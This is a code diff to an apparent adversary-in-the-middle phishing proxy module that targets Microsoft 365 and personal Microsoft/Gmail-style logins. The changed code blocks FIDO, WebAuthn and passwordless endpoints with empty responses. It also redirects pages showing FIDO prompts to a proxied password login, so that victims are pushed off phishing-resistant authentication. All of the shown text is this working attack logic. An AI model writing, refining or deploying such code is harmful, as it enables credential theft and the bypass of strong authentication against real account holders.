@@ -801,37 +801,54 @@ class Office365Module(BaseModule):
                         'Invalid postBackUrl'
                     ]
                     
-                    # Check for FIDO-specific URL paths
-                    fido_url_indicators = [
-                        '/consumers/fido',
-                        '/fido/get'
+                    # Check for FIDO-specific URL paths - be more selective
+                    fido_url_paths = [
+                        '/consumers/fido/get',
+                        '/fido/webauthn/',
+                        '/passwordless/'
                     ]
                     
-                    # Check URL and content for FIDO indicators
+                    # Detect FIDO endpoints and block them instead of redirecting
                     current_url = target_url.lower()
-                    fido_in_url = any(indicator in current_url for indicator in fido_url_indicators)
-                    fido_in_content = any(indicator in content_str for indicator in fido_content_indicators)
+                    is_fido_endpoint = any(path in current_url for path in fido_url_paths)
                     
-                    # Check if we're already in a forced password flow to prevent loops
-                    already_forcing_password = 'forcepassword=1' in current_url
+                    # If this is a FIDO endpoint request, block it to prevent FIDO initialization
+                    if is_fido_endpoint:
+                        self.log(f"[AiTM] Blocking FIDO endpoint to prevent passwordless authentication: {target_url}")
+                        # Return empty response to block FIDO initialization
+                        from flask import Response
+                        return Response('', status=204, headers={'Content-Type': 'application/json'})
                     
-                    # If FIDO flow detected and not already forcing password, redirect to password-based flow
-                    if (fido_in_url or fido_in_content) and not already_forcing_password:
-                        self.log(f"[AiTM] FIDO/passwordless flow detected, redirecting to password flow")
-                        if hasattr(self, 'user') and self.user:
-                            personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
-                            is_personal = any(domain in self.user.lower() for domain in personal_domains)
-                            
-                            if is_personal:
-                                # Simple redirect to password login for personal accounts - avoid loop parameters
-                                password_params = f"username={self.user}&forcepassword=1"
-                                password_url = f"https://{current_host}/proxy/login.srf?{password_params}"
-                                return redirect(password_url, code=302)
-                            else:
-                                # Force redirect to password login for organizational accounts
-                                password_params = f"username={self.user}&login_hint={self.user}&forcepassword=1"
-                                password_url = f"https://{current_host}/proxy/common/login?{password_params}"
-                                return redirect(password_url, code=302)
+                    # Only check for FIDO in main page content, not background requests
+                    is_main_page_request = (
+                        flask_request.method == 'GET' and 
+                        'text/html' in flask_request.headers.get('Accept', '') and
+                        not any(bg_indicator in target_url.lower() for bg_indicator in [
+                            'getexperimentassignments', 'telemetry', 'api/', 'ajax/', '.json', '.js'
+                        ])
+                    )
+                    
+                    if is_main_page_request:
+                        fido_in_content = any(indicator in content_str for indicator in fido_content_indicators)
+                        already_forcing_password = 'forcepassword=1' in current_url
+                        
+                        # Only redirect main page requests to password flow, not background requests
+                        if fido_in_content and not already_forcing_password:
+                            self.log(f"[AiTM] FIDO content detected in main page, redirecting to password flow")
+                            if hasattr(self, 'user') and self.user:
+                                personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+                                is_personal = any(domain in self.user.lower() for domain in personal_domains)
+                                
+                                if is_personal:
+                                    # Simple redirect to password login for personal accounts
+                                    password_params = f"username={self.user}&forcepassword=1"
+                                    password_url = f"https://{current_host}/proxy/login.srf?{password_params}"
+                                    return redirect(password_url, code=302)
+                                else:
+                                    # Force redirect to password login for organizational accounts
+                                    password_params = f"username={self.user}&login_hint={self.user}&forcepassword=1"
+                                    password_url = f"https://{current_host}/proxy/common/login?{password_params}"
+                                    return redirect(password_url, code=302)
                     
                     # Replace Microsoft URLs with our proxy URLs
                     replacements = [
